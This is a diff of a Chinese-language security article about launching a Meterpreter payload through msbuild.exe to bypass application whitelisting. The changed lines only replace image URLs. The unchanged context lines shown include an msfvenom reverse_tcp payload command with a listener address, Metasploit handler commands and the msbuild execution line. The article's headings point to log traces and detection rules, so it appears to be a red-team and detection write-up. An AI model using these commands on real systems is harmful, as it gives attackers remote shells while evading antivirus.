@@ -40,7 +40,7 @@ windows 安全日志（需要自行配置）据称可以绕过360，待确认
 msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp
 ```
 
-![载荷](https://img-blog.csdnimg.cn/20200413135116398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)
+![载荷](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70.png)
 
 #### XML文件设置
 
@@ -110,7 +110,7 @@ msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192
   </Project>
 ```
 
-![XML文件设置](https://img-blog.csdnimg.cn/20200413135530841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)
+![XML文件设置](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20210720144459841.png)
 
 #### 设置监听
 
@@ -122,7 +122,7 @@ msf exploit(multi/handler) > set lport 4444
 msf exploit(multi/handler) > exploit
 ```
 
-![监听](https://img-blog.csdnimg.cn/20200413140326808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)
+![监听](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20210720144504285.png)
 
 #### 靶机执行payload
 
@@ -130,15 +130,15 @@ msf exploit(multi/handler) > exploit
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.xml
 ```
 
-![加载payload](https://img-blog.csdnimg.cn/20200413140707313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)
+![加载payload](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20210720144508669.png)
 
 #### 查看会话
 
-![反弹会话](https://img-blog.csdnimg.cn/20200413140810400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)
+![反弹会话](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20210720144513157.png)
 
 ## 测试留痕
 
-![日志留痕](https://img-blog.csdnimg.cn/20200413140937397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70)
+![日志留痕](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20210720144517430.png)
 
 ## 检测规则/思路
 
